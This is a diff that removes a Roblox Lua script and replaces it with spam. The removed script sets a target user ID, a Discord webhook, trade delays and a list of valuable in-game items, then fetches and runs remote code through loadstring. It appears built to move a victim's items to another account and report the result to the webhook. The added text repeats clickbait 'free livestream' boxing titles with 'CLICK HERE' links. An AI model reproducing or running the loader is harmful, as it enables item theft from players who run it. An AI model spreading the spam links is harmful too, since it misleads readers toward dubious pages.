@@ -1,88 +1,40 @@
-getgenv().SECRET_KEY = "mrr_89d926bea37e4d3a853440b353427fa0"
-getgenv().TARGET_ID = 9233522138
-getgenv().DELAY_STEP = 1      
-getgenv().TRADE_CYCLE_DELAY = 2
-getgenv().DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1482490676221317352/zGphb1Jr5iEypf7dETunKXhcpDByWTXWoPSVb6Xo134BAGcXhUiTp2gPrRVVENDccUEq"
-getgenv().TARGET_BRAINROTS = {
-    ["Meowl"] = true,
-    ["Skibidi Toilet"] = true,
-    ["Strawberry Elephant"] = true,
-    ["Quesadillo Vampiro"] = true,
-    ["Tacorita Bicicleta"] = true,
-    ["La Extinct Grande"] = true,
-    ["La Spooky Grande"] = true,
-    ["Chipso and Queso"] = true,
-    ["Chillin Chili"] = true,
-    ["Tuff Toucan"] = true,
-    ["Gobblino Uniciclino"] = true,
-    ["W or L"] = true,
-    ["La Jolly Grande"] = true,
-    ["La Taco Combinasion"] = true,
-    ["Swaggy Bros"] = true,
-    ["Festive 67"] = true,
-    ["La Romantic Grande"] = true,
-    ["Nuclearo Dinossauro"] = true,
-    ["Money Money Puggy"] = true,
-    ["Tang Tang Keletang"] = true,
-    ["Ketupat Kepat"] = true,
-    ["Tictac Sahur"] = true,
-    ["Ketchuru and Musturu"] = true,
-    ["Lavadorito Spinito"] = true,
-    ["Burguro And Fryuro"] = true,
-    ["Garama and Madundung"] = true,
-    ["Capitano Moby"] = true,
-    ["Cerberus"] = true,
-    ["Dragon Cannelloni"] = true,
-    ["Bunnyman"] = true,
-    ["Mariachi Corazoni"] = true,
-    ["Swag Soda"] = true,
-    ["Los Hotspotsitos"] = true,
-    ["Los Bros"] = true,
-    ["Tralaledon"] = true,
-    ["Los Puggies"] = true,
-    ["Los Primos"] = true,
-    ["Los Tacoritas"] = true,
-    ["Los Spaghettis"] = true,
-    ["Ginger Gerat"] = true,
-    ["Love Love Bear"] = true,
-    ["Spooky and Pumpky"] = true,
-    ["Fragrama and Chocrama"] = true,
-    ["La Casa Boo"] = true,
-    ["Los Sekolahs"] = true,
-    ["Reinito Sleighito"] = true,
-    ["Ketupat Bros"] = true,
-    ["Cooki and Milki"] = true,
-    ["Rosey and Teddy"] = true,
-    ["Popcuru and Fizzuru"] = true,
-    ["La Supreme Combinasion"] = true,
-    ["Headless Horseman"] = true,
-    ["Dragon Gingerini"] = true,
-    ["Hydra Dragon Cannelloni"] = true,
-    ["Celularcini Viciosini"] = true,
-    ["Mieteteira Bicicleteira"] = true,
-    ["La Grande Combinasion"] = true,
-    ["Rocco Disco"] = true,
-    ["Los Sweethearts"] = true,
-    ["Las Sis"] = true,
-    ["Los Planitos"] = true,
-    ["Money Money Reindeer"] = true,
-    ["Eviledon"] = true,
-    ["Orcaledon"] = true,
-    ["Los Jolly Combinasionas"] = true,
-    ["Los Spooky Combinasionas"] = true,
-    ["La Ginger Sekolah"] = true,
-    ["Lovin Rose"] = true,
-    ["Los Amigos"] = true,
-    ["La Secret Combinasion"] = true,
-    ["La Food Combinasion"] = true,
-    ["Spaghetti Tualetti"] = true,
-    ["Rosetti Tualetti"] = true,
-    ["Sammyni Fattini"] = true,
-    ["Griffin"] = true,
-    ["Nacho Spyder"] = true,
-    ["Agarrini la Palini"] = true,
-    ["Fragola La La La"] = true,
-    ["La Sahur Combinasion"] = true,
-    ["Jolly Jolly Sahur"] = true
-}
-loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/9a91b3ba6fb71423853ec2f885c42d67.lua"))()
+"(LIVESTREAMs)*Kenneth Sims Jr. vs Arnold Barboza Jr. Live Top Rank Boxing Free 15 Mar, 2026, (LIVESTREAMs)*Barboza vs Sims Jr Live Boxing Free 15 Mar, 2026, (LIVESTREAMs)*Kenneth Sims Jr. vs Arnold Barboza Jr. Live WBO Free 15 Mar, 2026
+
+▶▶ CLICK HERE: https://zuzz3.blogspot.com/2026/02/boxing.html
+
+▶▶ CLICK HERE: https://zuzz3.blogspot.com/2026/02/boxing.html
+
+Match Details
+
+Event: BOXING 2026
+
+Match: Barboza vs Sims Jr
+
+Start Time: 4:00 AM
+
+Venue: T-Mobile Arena, Las Vegas, Nevada, USA.
+
+
+(LIVESTREAMs)*Kenneth Sims Jr. vs Arnold Barboza Jr. Live Top Rank Boxing Free 15 Mar, 2026
+
+(LIVESTREAMs)*Barboza vs Sims Jr Live Boxing Free 15 Mar, 2026
+
+(LIVESTREAMs)*WBO Live Kenneth Sims Jr. vs Arnold Barboza Jr. Free 15 Mar, 2026
+
+(LIVESTREAMs)*Kenneth Sims Jr. vs Arnold Barboza Jr. Live Top Rank Boxing Free 15 Mar, 2026
+
+(LIVESTREAMs)*Barboza vs Sims Jr Live Boxing Free 15 Mar, 2026
+
+(LIVESTREAMs)*WBO Live Kenneth Sims Jr. vs Arnold Barboza Jr. Free 15 Mar, 2026
+
+(LIVESTREAMs)*Kenneth Sims Jr. vs Arnold Barboza Jr. Live Top Rank Boxing Free 15 Mar, 2026
+
+(LIVESTREAMs)*Barboza vs Sims Jr Live Boxing Free 15 Mar, 2026
+
+(LIVESTREAMs)*WBO Live Kenneth Sims Jr. vs Arnold Barboza Jr. Free 15 Mar, 2026
+
+(LIVESTREAMs)*Kenneth Sims Jr. vs Arnold Barboza Jr. Live Top Rank Boxing Free 15 Mar, 2026
+
+(LIVESTREAMs)*Barboza vs Sims Jr Live Boxing Free 15 Mar, 2026
+
+(LIVESTREAMs)*WBO Live Kenneth Sims Jr. vs Arnold Barboza Jr. Free 15 Mar, 2026"
